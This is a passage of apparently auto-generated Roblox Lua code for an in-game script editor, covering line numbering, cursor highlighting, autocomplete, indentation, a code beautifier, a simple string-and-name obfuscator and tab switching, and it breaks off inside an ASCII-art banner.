		function Input:setVisible(visible)
			if self.InputCursor then self.InputCursor.Visible = visible end
			if self.LineHighligher then self.LineHighligher.Visible = visible end
		end

		function Input:changeTheme(theme)
			self.Theme = theme
			if self.InputCursor then
				self.InputCursor.BackgroundColor3 = theme.CURSOR_COLOR
			end
			if self.LineHighligher then
				self.LineHighligher.Outline.Color = theme.OUTLINE
				self.LineHighligher.BackgroundColor3 = theme.DARK_BACKGROUND
				self.LineHighligher.Outline.Transparency = theme.LINE_HIGHLIGHTER_OUTLINE_TRANSPARENCY
			end

			self.LineHighligher.ZIndex = self.Textbox.ZIndex + 1
			self.InputCursor.ZIndex = self.Textbox.ZIndex + 1

			spawn(pcall, function()
				local cursorPos = self.Textbox.CursorPosition - 1
				local cursorLines = (cursorPos > #self.Textbox.Text and self.Textbox.Text .. (" "):rep(cursorPos - #self.Textbox.Text) or self.Textbox.Text):sub(0, cursorPos):split("\n")

				local cursorLineText = cursorLines[#cursorLines]
				local cursorWidth = self.Services.TextService:GetTextSize(cursorLineText, self.Textbox.TextSize, self.Textbox.Font, Vector2.new(math.huge, math.huge)).X

				local textSize = self.Services.TextService:GetTextSize("", self.Textbox.TextSize, self.Textbox.Font, Vector2.new())

				local leftShift = 1
				if self.Theme then
					if self.Theme.LINE_NUMBER_HIGHLIGHT_TRANSPARENCY:lower() ~= "none" then
						leftShift = 2
					end
				end

				self.LineHighligher:TweenPosition(UDim2.new(0,-leftShift,0, textSize.Y * (#cursorLines - 1)), 'Out', 'Quad', 0, true,nil)
			end)
		end

		return Input

	end;
};
G2L_MODULES[G2L["46"]] = {
	Closure = function()
		local script = G2L["46"];local Lines = {}

		function Lines:set(data)
			self.Label = nil
			self.Editor = nil
			self.Textbox = nil

			self.Highlighter = nil

			self._lineCount = 0
			self._charCount = 0
			self._lines = 0

			self.Services = {}
			self.Theme = {}
			self.Data = data

			self:init()
		end

		function Lines:init()
			self.Label = self.Data.label
			self.Editor = self.Data.editor
			self.Textbox = self.Data.textbox

			self.Highlighter = script.Highlighter:Clone()

			self.Highlighter.ZIndex = self.Label.ZIndex + 1
			self.Highlighter.Parent = self.Label.Parent.Padded
			self.Label.ZIndex += 2
			self.Highlighter.ZIndex = self.Label.ZIndex + 1

			self.Label.Text = 1

			self._lineCount = 0
			self._lines = 1

			self.RESIZE_ADD = 9
			self.RESIZE_MULT = 15

			self.Services = {
				TextService = game:GetService("TextService"),
			}
			self.Theme = self.Data.theme

			self.Textbox:GetPropertyChangedSignal("FontFace"):Connect(function()
				self.Label.FontFace = self.Textbox.FontFace
			end)

			spawn(function()
				task.wait()
				self:update()
			end)
		end

		function Lines:update(data)
			data = data or {}

			local textSize = self.Services.TextService:GetTextSize("", self.Textbox.TextSize, self.Textbox.Font, Vector2.new());
			local cursorPos = self.Textbox.CursorPosition

			local currentLine = 1

			self._lineCount = 0
			self._lines = 1

			local _, charCount = self.Textbox.Text:gsub("", "")
			charCount -= 1

			if charCount > 0 then
				_, self._lineCount = self.Textbox.Text:gsub("\n", "")
				self._lineCount += 1
			end

			self.Textbox.Size = UDim2.new(
				self.Textbox.Size.X.Scale,
				self.Textbox.Size.X.Offset,
				1,
				self._lineCount*(textSize.Y*self.Textbox.LineHeight) + (self.RESIZE_ADD) * (self.RESIZE_MULT)
			)
			self.Editor.CanvasSize = UDim2.new(
				self.Editor.CanvasSize.X.Scale,
				self.Editor.CanvasSize.X.Offset,
				0,
				self._lineCount*(textSize.Y*self.Textbox.LineHeight) + (self.RESIZE_ADD) * (self.RESIZE_MULT) * 1.5
			)
			self.Label.Size = UDim2.new(
				self.Label.Size.X.Scale,
				self.Label.Size.X.Offset,
				1,
				self.Editor.AbsoluteCanvasSize.Y + 6
			)

			if cursorPos > 1 then
				local subText = self.Textbox.Text:sub(1, cursorPos - 1)
				currentLine = #subText:split("\n")
			end

			self.Textbox.Text:gsub("\n", function()
				self._lines = self._lines + 1
			end)

			self.Label.Text = ""

			local cursorPos = self.Textbox.CursorPosition - 1
			local cursorLines = (cursorPos > #self.Textbox.Text and self.Textbox.Text .. (" "):rep(cursorPos - #self.Textbox.Text) or self.Textbox.Text):sub(0, cursorPos):split("\n")

			self.Highlighter.Size = UDim2.new(0, (self.Label.AbsoluteSize.X + 10), 0, textSize.Y + 3)
			self.Highlighter:TweenPosition(UDim2.new(0,-2,0, textSize.Y * (#cursorLines - 1)), 'Out', 'Quad', data.speed or .1, true,nil)

			self.Highlighter.ZIndex = self.Label.ZIndex + 1

			for index = 1, self._lines do
				if index == currentLine then
					local format = "<b>%s</b>"
					format = string.format("<font color='#%s'>", self.Theme.TEXT_COLOR:ToHex())..format.."</font>"

					self.Label.Text = self.Label.Text .. string.format(format, index) .. "\n"
				else
					self.Label.Text = self.Label.Text .. index .. "\n"
				end
			end
		end

		function Lines:changeTheme(theme)
			self.Theme = theme
			self.Highlighter.BackgroundColor3 = theme.DARK_BACKGROUND
			self.Highlighter.Outline.Color = theme.OUTLINE
			self.Highlighter.Outline.Transparency = theme.LINE_HIGHLIGHTER_OUTLINE_TRANSPARENCY

			if theme.LINE_NUMBER_HIGHLIGHT_TRANSPARENCY:lower() == "semi" then
				self.Highlighter.BackgroundTransparency = .95
			elseif theme.LINE_NUMBER_HIGHLIGHT_TRANSPARENCY:lower() == "full" then
				self.Highlighter.BackgroundTransparency = .9
			elseif theme.LINE_NUMBER_HIGHLIGHT_TRANSPARENCY:lower() == "none" then
				self.Highlighter.BackgroundTransparency = 1
				self.Highlighter.Outline.Transparency = 1
			end

			self.Highlighter.ZIndex = self.Label.ZIndex + 1

			self:update()
		end

		return Lines

	end;
};
G2L_MODULES[G2L["4a"]] = {
	Closure = function()
		local script = G2L["4a"];local Indenter = {}

		function Indenter:set(data)
			self.Textbox = nil

			self.Tabs = 0

			self.Services = {}
			self.Data = data

			self:init()
		end

		function Indenter:init()
			self.Textbox = self.Data.textbox

			self.Services = {
				TextService = game:GetService("TextService"),
			}

			self.Shared = require(script.Parent.Shared)
		end

		function Indenter:convertTabs(text)
			return text:gsub("\t", "    ")
		end

		function Indenter:updateMousePos()
			self.Textbox.CursorPosition += 3
		end

		function Indenter:indentBrackets()
			local indentableBrackets = {
				["{"] = "}",
				["("] = ")",
				["["] = "]",
			}

			local textboxText = self.Shared:removeControlBytes(self.Textbox.Text)

			local function makeIndent()
				self.Textbox.Text = string.sub(textboxText, 1, self.Textbox.CursorPosition - 1).."    " .. "\n"..""..string.sub(textboxText, self.Textbox.CursorPosition)
			end

			for index, value in pairs(indentableBrackets) do
				if self.Shared:getWord(index, 2, self.Textbox) then
					makeIndent()
					spawn(function()
						self.Textbox.CursorPosition += 4
					end)
				end
			end
		end

		function Indenter:autoIndent(currentLine, allLines)
			local previousLine = allLines[currentLine - 1] or ""
			local currentIndentation = string.match(previousLine, "^%s*") or ""

	--[[
	if previousLine:match("[{[(]$") or previousLine:match("function%s") or previousLine:match("then$") or previousLine:match("do$") then
		currentIndentation = currentIndentation .. "    "
	end

	if previousLine:match("end$") or previousLine:match("^%s*else$") or previousLine:match("^%s*elseif%s") or previousLine:match("^%s*until%s") then
		currentIndentation = currentIndentation:gsub("    $", "")
	end
	]]

			return currentIndentation
		end

		return Indenter
	end;
};
G2L_MODULES[G2L["4b"]] = {
	Closure = function()
		local script = G2L["4b"];local Autocomplete = {}

		function Autocomplete:set(data)
			self.Textbox = nil

			self.Services = {}
			self.Data = data

			self:init()
		end

		function Autocomplete:init()
			self.Textbox = self.Data.textbox
			self.Shared = require(script.Parent.Shared)

			local frame = script.AutocompleteFrame:Clone()
			frame.Parent = self.Textbox
			frame.Visible = false
			self.AutocompleteFrame = frame
			local paleteTemp = script.Palete:Clone()
			paleteTemp.Visible = true
			self.PaleteTemp = paleteTemp

			self.LanguageKeywords = require(script.Language)
			self.Keywords = {}
			self.RealKeywords = {}
			self.Paletes = {}
			self.Theme = {
				THEME_COLOR = Color3.fromRGB(255, 0, 0),

				TEXT_COLOR = Color3.fromRGB(235, 235, 235),
				SHADED_TEXT = Color3.fromRGB(150, 150, 150),

				OUTLINE = Color3.fromRGB(50, 50, 50),
			}
			self.KeywordIcons = {
				["keyword"] = 119893371750481,
				["builtin"] = 2790219957,
				["properties"] = 2790215349,
				["booleans"] = 98884210055846,
			}
			self.Services = {
				UserInputService = game:GetService("UserInputService")
			}

			self.SelectionLevel = 1
			self.MaxLevel = 5
			self.CurrentIndex = 0

			self._lastCursorPos = 0
			self._currentChars = ""
			self._currentWord = ""

			self._selected = false

			self.insertKeywords = function(newKeywords)
				self.LanguageKeywords = newKeywords
				self.Keywords = {}

				local function insertSection(section, name)
					for index, _ in pairs(section) do
						table.insert(self.Keywords, {
							icon = self.KeywordIcons[name],
							text = tostring(index),
							keyType = name,
						})
					end
					for index, value in pairs(section) do
						self.RealKeywords[index] = value
					end
				end

				local keywords = self.LanguageKeywords["keyword"]
				local builtins = self.LanguageKeywords["builtin"]
				local properties = self.LanguageKeywords["properties"]
				local booleans = self.LanguageKeywords["booleans"]

				insertSection(keywords, "keyword")
				insertSection(builtins, "builtin")
				insertSection(properties, "properties")
				insertSection(booleans, "booleans")
			end

			self.insertKeywords(self.LanguageKeywords)
		end

		function Autocomplete:completeBracket(data)
			local text = self.Shared:removeControlBytes(self.Textbox.Text)
			local addedChars = string.sub(text, self.Textbox.CursorPosition - 1, self.Textbox.CursorPosition - 1)
			local addedWord, cursorPosUntilAddedWord do
				local textTable =  string.split(string.gsub(text, "    ", "\n"), " ")
				addedWord = table.remove(textTable, #textTable)
				addedWord = string.gsub(addedWord, "\t", "")
				addedWord = string.gsub(addedWord, "\n", "")
				textTable = table.concat(textTable, " ")
				cursorPosUntilAddedWord = if #textTable == 0 then 0 else #textTable + #(" ")
			end
			if data.debounce and data.autocompleteCharacters[addedChars] then
				if not data.deleting and not (data.focused == false) then
					data.debounce = false
					self.Textbox.Text = string.sub(text, 1, self.Textbox.CursorPosition - 1)..data.autocompleteCharacters[addedChars]..string.sub(text, self.Textbox.CursorPosition)
				end
			else
				data.debounce = true
			end
		end

		function Autocomplete:setFrameVisible(boolean)
			self._lastCursorPos = self.Textbox.CursorPosition
			self.AutocompleteFrame.Visible = boolean
			self.Textbox.MultiLine = not boolean
		end

		function Autocomplete:setPosition(data)
			self.Shared:tween(self.AutocompleteFrame, TweenInfo.new(data.speed), {Position = data.position})
		end

		function Autocomplete:getWordAtCursor(cursorPos)
			local text = self.Textbox.Text

			local currentPos = 0
			for line in text:gmatch("([^\n]*)\n?") do
				local lineLength = #line + 1

				if cursorPos <= currentPos + lineLength then
					local relativePos = cursorPos - currentPos
					return self:getWordInLine(line, relativePos)
				end

				currentPos = currentPos + lineLength
			end

			return ""
		end

		function Autocomplete:getWordInLine(line, lineCursorPos)
			if not line or lineCursorPos <= 0 then
				return false
			end

			local wordStart, wordEnd

			for startPos, word, endPos in line:gmatch("()([%w_]+)()") do
				if lineCursorPos >= startPos and lineCursorPos <= endPos then
					wordStart = startPos
					wordEnd = endPos - 1
					break
				end
			end

			if not wordStart or not wordEnd then
				return false
			end

			local word = line:sub(wordStart, wordEnd)
			if word == "" then
				return false
			end

			local suggestions = self:getSuggestions(word, true)
			if not suggestions then
				return false
			end

			return word
		end

		function Autocomplete:getSuggestions(word, isGettingWord)
			local suggestions = {}

			for index, value in ipairs(self.AutocompleteFrame.Paletes:GetChildren()) do
				if value:IsA("TextButton") then
					value:Destroy()
				end
			end

			local paleteIndex = 0
			self.CurrentIndex = 0

			self.AutocompleteFrame.ZIndex = self.Textbox.ZIndex + 3
			self.AutocompleteFrame.KeywordInfo.ZIndex = self.Textbox.ZIndex + 4
			self.AutocompleteFrame.KeywordInfo.TextLabel.ZIndex = self.Textbox.ZIndex + 4
			self.AutocompleteFrame.Paletes.ZIndex = self.Textbox.ZIndex + 4

			self.PaleteTemp.ZIndex = self.AutocompleteFrame.Paletes.ZIndex + 5
			self.PaleteTemp.Icon.ZIndex = self.PaleteTemp.ZIndex + 1

			self.Paletes = {}

			for _, keyword in ipairs(self.Keywords) do
				if keyword.text:sub(1, #word) == word then
					table.insert(suggestions, keyword.text)

					paleteIndex += 1
					self.CurrentIndex += 1

					local actualIndex = paleteIndex
					local paleteHovering = false

					local palete = self.PaleteTemp:Clone()
					palete.Parent = self.AutocompleteFrame.Paletes
					palete.Name = keyword.text
					palete.Text = `<b><font color='#{self.Theme.THEME_COLOR:ToHex()}'>`..word.."</font></b>"
						.. string.rep("", #word)
						.. keyword.text:sub(#word + 1)
					palete.MouseEnter:Connect(function()
						paleteHovering = true
					end)
					palete.MouseLeave:Connect(function()
						paleteHovering = false
					end)

					local conn conn = self.Services.UserInputService.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 and paleteHovering then
							self.SelectionLevel = actualIndex

							self:getLevel()
							self:completeWord()
						end
					end)

					palete.Destroying:Connect(function()
						conn:Disconnect()
						conn = nil
					end)

					palete.Text = palete.Text .. ` <font color='#{self.Theme.SHADED_TEXT:ToHex()}'>`..`[{tostring(keyword.keyType)}]`.."</font>"

					if paleteIndex <= 5 then
						self.AutocompleteFrame.Paletes.Size = UDim2.new(1, 0, 0, self.CurrentIndex * palete.Size.Y.Offset)
					end

					if keyword.icon then
						palete.Icon.Image = `rbxassetid://{keyword.icon}`
					end

					local paleteTable = {
						Palete = palete,
						Index = paleteIndex,
						Word = keyword.text
					}

					if paleteIndex > self.MaxLevel then
						palete:Destroy()
					else
						table.insert(self.Paletes, paleteTable)
						if self.SelectionLevel > paleteIndex then
							if not self._selected then
								self.SelectionLevel = paleteIndex
							end
						end

						self._currentWord = word

						spawn(function()
							self:getLevel()
						end)
					end
				end
			end

			return #suggestions > 0 and suggestions or false -- Return suggestions or false if none found
		end

		function Autocomplete:selectDown()
			if #self.Paletes == 0 then
				return
			end
			if self.SelectionLevel < self.MaxLevel then
				if self.SelectionLevel >= self.CurrentIndex then
					self.SelectionLevel = 1
				else
					self.SelectionLevel += 1
				end
			end

			self:getLevel()

			self._selected = true

			local numString = #string.sub(self.Textbox.Text, 1, self.Textbox.CursorPosition - 1)..string.sub(self.Textbox.Text, self.Textbox.CursorPosition)
			return tonumber(numString)
		end

		function Autocomplete:selectUp()
			if #self.Paletes == 0 then
				return
			end
			if self.SelectionLevel > 0 then
				self.SelectionLevel -= 2
				if self.SelectionLevel <= -1 then
					self.SelectionLevel = #self.Paletes
				end
			end

			self:getLevel()

			self._selected = true

			local numString = #string.sub(self.Textbox.Text, 1, self.Textbox.CursorPosition - 1)..string.sub(self.Textbox.Text, self.Textbox.CursorPosition)
			return tonumber(numString)
		end

		function Autocomplete:getLevel()
			for index, value in ipairs(self.Paletes) do
				if value.Index == self.SelectionLevel then
					value.Palete.BackgroundTransparency = .9
					self._currentChars = value.Word

					if self.RealKeywords[value.Word] and type(self.RealKeywords[value.Word]) == "table" then
						self.AutocompleteFrame.KeywordInfo.TextLabel.Text = self.RealKeywords[value.Word].desc else
						self.AutocompleteFrame.KeywordInfo.TextLabel.Text = `<b>{value.Word}</b> :: Info not found.`
					end
				else
					value.Palete.BackgroundTransparency = 1
				end
			end
		end

		function Autocomplete:setSelected(boolean)
			self._selected = boolean
		end

		function Autocomplete:getCursorLineAndColumn()
			local text = self.Textbox.Text
			local cursorPos = self.Textbox.CursorPosition

			local line, column = 1, 1
			local currentPos = 1

			for i = 1, #text do
				if i == cursorPos then
					column = i - currentPos + 1
					return line, column
				end

				if text:sub(i,i) == "\n" then
					line += 1
					currentPos = i + 1
				end
			end

			column = cursorPos - currentPos + 1
			return line, column
		end

		function Autocomplete:completeWord()
			if #self.Paletes == 0 then
				return
			end

			local text = self.Shared:removeControlBytes(self.Textbox.Text)
			local addedWord, cursorPosUntilAddedWord do
				local textTable =  string.split(string.gsub(text, "    ", "\n"), " ")
				addedWord = table.remove(textTable, #textTable)
				addedWord = string.gsub(addedWord, "\t", "")
				addedWord = string.gsub(addedWord, "\n", "")
				textTable = table.concat(textTable, " ")
				cursorPosUntilAddedWord = if #textTable == 0 then 0 else #textTable + #(" ")
			end

			local function autocompleteReplace(text, targetword, replacement, cursorPos, removefirsttab)
				local before = text:sub(1, cursorPos - 1)
				local after = text:sub(cursorPos)

				local wordStart, wordEnd = before:find("([%w_]+)$")

				local afterMatch = after:match("^([%w_]+)")
				local afterSkip = afterMatch and #afterMatch or 0

				local newText
				local newCursorPos

				if wordStart then
					newText = before:sub(1, wordStart - 1) .. replacement .. after:sub(afterSkip + 1)
					newCursorPos = wordStart - 1 + #replacement + 1
				else
					newText = before .. replacement .. after:sub(afterSkip + 1)
					newCursorPos = #before + #replacement + 1
				end

				if removefirsttab then
					newText = newText:gsub("    ", "", 1)
				end

				return newText, newCursorPos
			end

			local replacement, newPos = autocompleteReplace(text, addedWord, self._currentChars, self.Textbox.CursorPosition, false)
			self.Textbox.Text = replacement

			self._selected = false

			task.spawn(function()
				for i = 1, 3 do
					self:setFrameVisible(false)
					task.wait()
				end
			end)
			spawn(function()
				--self.Textbox.CursorPosition = newPos
				self.Textbox:CaptureFocus()
			end)
		end

		function Autocomplete:isVisible()
			return self.AutocompleteFrame.Visible
		end

		function Autocomplete:getCurrentChars()
			return self._currentChars
		end

		function Autocomplete:getCurrentWord()
			return self._currentWord
		end

		function Autocomplete:changeTheme(theme)
			self.AutocompleteFrame.UIStroke.Color = theme.OUTLINE
			self.PaleteTemp.Icon.ImageColor3 = theme.THEME_COLOR
			self.PaleteTemp.BackgroundColor3 = theme.SELECT_BACKGROUND

			self.Theme = theme
		end

		function Autocomplete:changeLang(library)
			if type(library) ~= "table" then
				return
			end
			self.insertKeywords(library)
		end

		return Autocomplete

	end;
};
G2L_MODULES[G2L["4c"]] = {
	Closure = function()
		local script = G2L["4c"];return {	
			keyword = {
				["and"] = {desc = "<b>and statement</b> EX: if (VAR1) and (VAR2)"},
				["break"] = {desc = "<b>break statement</b> EX: while true do break"},
				["do"] = {desc = "<b>do statement</b> EX: for i,v in pairs(TABLE) do"},
				["else"] = {desc = "<b>else statement</b> EX: if (VAR) then else"},
				["elseif"] = {desc = "<b>elseif statement</b> EX: if (VAR) then elseif"},
				["end"] = {desc = "<b>end statement</b> EX: if (VAR) then end "},
				["for"] = {desc = "<b>for statement</b> EX: for i,v"},
				["function"] = {desc = "<b>function</b> creates a function by calling foo() EX: function foo()"},
				["if"] = {desc = "<b>if statement</b> EX: if (VAR)"},
				["in"] = {desc = "<b>in statement</b> EX: for i,v in ipairs()"},
				["local"] = {desc = "<b>local variable</b> EX: local VAR = 0"},
				["not"] = {desc = "<b>not</b> EX: if not (VAR)"},
				["while"] = {desc = "<b>while statement</b> EX: while (VAR)"},
				["or"] = {desc = "<b>or</b> EX: if (VAR1) or (VAR2)"},
				["repeat"] = {desc = "<b>repeat statement</b> EX: repeat (FUNCTION)"},
				["return"] = {desc = "<b>return</b> EX: return (VAR)"},
				["then"] = {desc = "<b>then statement</b> EX: if (VAR) then"},
				["self"] = {desc = '<b>self variable</b> EX: self.VAR = 0 || self["VAR"] = 0'},
				["until"] = {desc = "<b>until statement</b> EX: repeat (FUNCTION) until (VAR)"},
				["continue"] = {desc = "<b>continue</b> EX: if not (VAR) then continue"},
				["export"] = {desc = "<b>export</b> EX: export (VAR) {}"},
				["type"] = {desc = "<b>type</b> EX: if type(VAR) == 'string'"},
				["typeof"] = {desc = "<b>typeof</b> EX: if typeof(VAR) == 'Instance'"},
			},

			builtin = {
				-- Lua Functions
				["assert"] = true,
				["collectgarbage"] = true,
				["error"] = true,
				["getfenv"] = true,
				["getmetatable"] = true,
				["ipairs"] = true,
				["loadstring"] = true,
				["newproxy"] = true,
				["next"] = true,
				["pairs"] = true,
				["pcall"] = true,
				["print"] = true,
				["rawequal"] = true,
				["rawget"] = true,
				["rawset"] = true,
				["select"] = true,
				["setfenv"] = true,
				["setmetatable"] = true,
				["tonumber"] = true,
				["tostring"] = true,
				["unpack"] = true,
				["xpcall"] = true,
				["buffer"] = true,
				["Font"] = true,

				-- API functions


				-- Lua Variables
				["_G"] = true,
				["_VERSION"] = true,

				-- Lua Tables
				["bit32"] = true,
				["coroutine"] = true,
				["debug"] = true,
				["math"] = true,
				["os"] = true,
				["string"] = true,
				["table"] = true,
				["utf8"] = true,

				-- Roblox Functions
				["delay"] = true,
				["elapsedTime"] = true,
				["gcinfo"] = true,
				["require"] = true,
				["settings"] = true,
				["spawn"] = true,
				["tick"] = true,
				["time"] = true,
				["UserSettings"] = true,
				["wait"] = true,
				["warn"] = true,
				["ypcall"] = true,

				-- Roblox Variables
				["Enum"] = true,
				["shared"] = true,
				["script"] = true,
				["workspace"] = true,
				["Workspace"] = true,
				["plugin"] = true,
				["game"] = true,
				["Game"] = true,

				-- Roblox Tables
				["Axes"] = true,
				["BrickColor"] = true,
				["CatalogSearchParams"] = true,
				["CellId"] = true,
				["CFrame"] = true,
				["Color3"] = true,
				["ColorSequence"] = true,
				["ColorSequenceKeypoint"] = true,
				["DateTime"] = true,
				["DockWidgetPluginGuiInfo"] = true,
				["Faces"] = true,
				["File"] = true,
				["FloatCurveKey"] = true,
				["Instance"] = true,
				["NumberRange"] = true,
				["NumberSequence"] = true,
				["NumberSequenceKeypoint"] = true,
				["OverlapParams"] = true,
				["PathWaypoint"] = true,
				["PhysicalProperties"] = true,
				["PluginDrag"] = true,
				["Random"] = true,
				["Ray"] = true,
				["RaycastParams"] = true,
				["Rect"] = true,
				["Region3"] = true,
				["Region3int16"] = true,
				["RotationCurveKey"] = true,
				["task"] = true,
				["TextChatMessageProperties"] = true,
				["TweenInfo"] = true,
				["UDim"] = true,
				["UDim2"] = true,
				["Vector2"] = true,
				["Vector2int16"] = true,
				["Vector3"] = true,
				["Vector3int16"] = true,
			},

			properties = {
				-- Appearance
				["BrickColor"] = true,
				["CastShadows"] = true,
				["Color"] = true,
				["Material"] = true,
				["Reflectance"] = true,
				["MaterialVariant"] = true,
				["Transparency"] = true,
				["MeshId"] = true,
				["RenderFidelity"] = true,
				["TextureID"] = true,

				-- Data
				["Parent"] = true,
				["Name"] = true,
				["Archivable"] = true,
				["ClassName"] = true,
				["Locked"] = true,
				["ResizeableFaces"] = true,
				["ResizeIncrement"] = true,

				-- Transform
				["Size"] = true,
				["CFrame"] = true,
				["Orgin"] = true,
				["Position"] = true,
				["Orientation"] = true,
				["PivotOffset"] = true,

				-- Collision
				["CanCollide"] = true,
				["CanTouch"] = true,
				["CollisionGroup"] = true,

				-- Object
				["Anchored"] = true,
				["CenterOfMass"] = true,
				["CurrentPhysicalProperties"] = true,
				["CustomPhysicalProperties"] = true,
				["Mass"] = true,
				["Massless"] = true,
				["RootPriority"] = true,
				["Shape"] = true,
				["PrimaryPart"] = true,
				["Scale"] = true,

				-- Behavior
				["ModelStreamingMode"] = true,

				-- Assembly
				["AssemblyLinearVelocity"] = true,
				["AssemblyAngularVelocity"] = true,
				["AssemblyCenterOfMass"] = true,
				["AssemblyMass"] = true,
				["AssemblyRootPart"] = true,

				-- Script
				["Enabled"] = true,
				["Disabled"] = true,
				["Source"] = true,
				["CurrentEditor"] = true,
				["RunContext"] = true,
			},

			booleans = {
				["true"] = {desc = "<b>true boolean</b> EX: if (VAR) == true"},
				["false"] = {desc = "<b>false boolean</b> EX: if (VAR) == false"},
				["nil"] = {desc = "<b>nil</b> EX: if (VAR) == nil"},
			},
		}
	end;
};
G2L_MODULES[G2L["59"]] = {
	Closure = function()
		local script = G2L["59"];local Shared = {}

		function Shared:removeControlBytes(text)
			return string.gsub(text, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "")
		end

		function Shared:escapeSpecialChars(string)
			return (string:gsub('%%', '%%%%')
				:gsub('^%^', '%%^')
				:gsub('%$$', '%%$')
				:gsub('%(', '%%(')
				:gsub('%)', '%%)')
				:gsub('%.', '%%.')
				:gsub('%[', '%%[')
				:gsub('%]', '%%]')
				:gsub('%*', '%%*')
				:gsub('%+', '%%+')
				:gsub('%-', '%%-')
				:gsub('%?', '%%?'))
		end

		function Shared:tween(object, info, goal)
			local tween = game:GetService("TweenService"):Create(object, info, goal)
			tween:Play()
			return tween
		end

		function Shared:getWord(word, start, textbox)
			if type(word) == "string" then else return false end
			local len = word:len()
			local addedWord = ""
			for index = 1, len + 1 do
				local addedChars = string.sub(textbox.Text, textbox.CursorPosition - (1-index) - start, textbox.CursorPosition - (1-index) - start)
				local char = string.sub(word, index, index)
				if char == addedChars then
					addedWord = addedWord..char
				end
				if addedWord == word then
					return true
				end
			end
		end

		return Shared

	end;
};
G2L_MODULES[G2L["5b"]] = {
	Closure = function()
		local script = G2L["5b"];function beautify(code)
			local indent_level = 0
			local indent_char = "    "

			local function trim(s)
				return s:match("^%s*(.-)%s*$")
			end

			local function increase_indent()
				indent_level = indent_level + 1
			end

			local function decrease_indent()
				indent_level = math.max(indent_level - 1, 0)
			end

			local function get_indent()
				return string.rep(indent_char, indent_level)
			end

			local formatted_code = {}
			for line in code:gmatch("[^\n]+") do
				line = trim(line)

				if line:match("^end$") or line:match("^elseif ") or line:match("^else$") then
					decrease_indent()
				end

				table.insert(formatted_code, get_indent() .. line)

				if line:match("then$") or line:match("do$") or line:match("function%s") then
					increase_indent()
				end
			end

			return table.concat(formatted_code, "\n")
		end

		return beautify
	end;
};
G2L_MODULES[G2L["5c"]] = {
	Closure = function()
		local script = G2L["5c"];function obfuscate(script)
			-- Helper Functions
			local function generateRandomName()
				return "var" .. math.random(1000000, 9999999)
			end

			local function encryptString(str)
				local result = ""
				for i = 1, #str do
					local c = str:sub(i, i)
					local enc = string.format("\\x%02X", string.byte(c))
					result = result .. enc
				end
				return result
			end

			local function decryptString(str)
				return (str:gsub("\\x(%x%x)", function(hex)
					return string.char(tonumber(hex, 16))
				end))
			end

			-- Variable and Function Renaming
			local renamed = {}
			local counter = 0
			script = script:gsub("%f[%a_](%w+)%f[^%w_]", function(var)
				if not renamed[var] then
					counter = counter + 1
					renamed[var] = generateRandomName()
				end
				return renamed[var]
			end)

			-- String Encryption
			script = script:gsub('"(.-)"', function(str)
				return '"..decryptString(' .. encryptString(str) .. ').."'
			end)

			-- Add Decryption Function to the Script
			script = [[
        local function decryptString(str) 
            return (str:gsub("\\x(%x%x)", function(hex) 
                return string.char(tonumber(hex, 16)) 
            end)) 
        end 
    ]] .. script

			-- Complex Control Flow Obfuscation
			script = script .. [[
        local function wrapper() 
            local function _a() return true end 
            local function _b() if _a() then 
                while not false do 
                    if true then 
                        local function _c() return not false end 
                        if _c() then 
                            local _d = 0 
                            repeat 
                                local _e = function() return _d < 10 end 
                                if _e() then 
                                    local _f = function() 
                                        local _g = function() 
                                            return not not true 
                                        end 
                                        if _g() then 
                                            local _h = function() 
                                                return true 
                                            end 
                                            if _h() then 
                                                local _i = 1 
                                                while _i <= 10 do 
                                                    if _i % 2 == 0 then 
                                                        print("Hello from Roblox") 
                                                    end 
                                                    _i = _i + 1 
                                                end 
                                            end 
                                        end 
                                    end 
                                end 
                                _d = _d + 1 
                            until _d >= 10 
                        end 
                    end
                    break
                end 
            end end 
            _b() 
        end 
        wrapper() 
    ]]

			-- Additional Obfuscation
			script = "local dummy = function() return true end; local junk = function() " ..
				"for i=1,500 do if i % 3 == 0 then local a = i * 2 end end end; junk(); dummy(); " .. script

			-- Whitespace Removal & Code Flattening
			--script = script:gsub("%s+", "") -- Remove whitespace and newlines
			--script = script:gsub("\n", "") -- Remove newlines
			script = script:gsub("endend", "end") -- Flatten end statements

			return script
		end

		return obfuscate
	end;
};
G2L_MODULES[G2L["70"]] = {
	Closure = function()
		local script = G2L["70"];local TabControl = {}
		TabControl.__index = TabControl

		function TabControl.new()
			local self = setmetatable({}, TabControl)

			self.CurrentTab = nil
			self.LastActivatedTab = nil

			self.TabSessions = {}

			return self
		end

		function TabControl:_validateConfig(defaults, newConfig)
			for key, value in pairs(defaults) do
				if newConfig[key] == nil then
					newConfig[key] = value
				end
			end
			return newConfig
		end

		function TabControl:AddTab(button, name, onActivate, onDeactivate)
			local active = false

			local session = {
				name = name,
				temp = button,

				onActive = function(currentTab)
					self.CurrentTab = currentTab
					currentTab.active = true
					active = true
					if type(onActivate) == "function" then
						onActivate(currentTab)
					end
				end,
				onDeactive = function(currentTab)
					active = false
					currentTab.active = false
					if type(onDeactivate) == "function" then
						onDeactivate(currentTab)
					end
				end,

				active = active,
			}

			if not self.CurrentTab then
				session.onActive(session)
			end

			button.Destroying:Connect(function()
				session.onActive = function() end
				session.onDeactive = function() end
				session.name = nil
				session.temp = nil
				session.active = nil
			end)

			if button:IsA("TextButton") or button:IsA("ImageButton") then
				button.Activated:Connect(function()
					if active then
						return
					else
						self.CurrentTab.onDeactive(self.CurrentTab)
						session.onActive(session)
					end
				end)
			end

			return session
		end

		function TabControl:SwitchTab(session)
			if self.CurrentTab == session and type(session) ~= "table" then
				return
			end
			self.CurrentTab.onDeactive(self.CurrentTab)
			session.onActive(session)
			self.CurrentTab = session
		end

		return TabControl
	end;
};
G2L_MODULES[G2L["71"]] = {
	Closure = function()
		local script = G2L["71"];--[[
	██████╗░███████╗░██████╗██╗░░░██╗██████╗░░█████╗░███╗░░██╗░██████╗██╗░░██╗██╗██████╗░██╗░░░██╗
	██╔══██╗██╔════╝██╔════╝██║░░░██║██╔══██╗██╔══██╗████╗░██║██╔════╝██║░░██║██║██╔══██╗██║░░░██║
	██████╔╝█████╗░░╚█████╗░██║░░░██║██████╔╝██║░░██║██╔██╗██║╚█████╗░███████║██║██████╦╝██║░░░██║
	██╔══██╗██╔══╝░░░╚═══██╗██║░░░██║██╔═══╝░██║░░██║██║╚████║░╚═══██╗██╔══██║██║██╔══██╗██║░░░██║
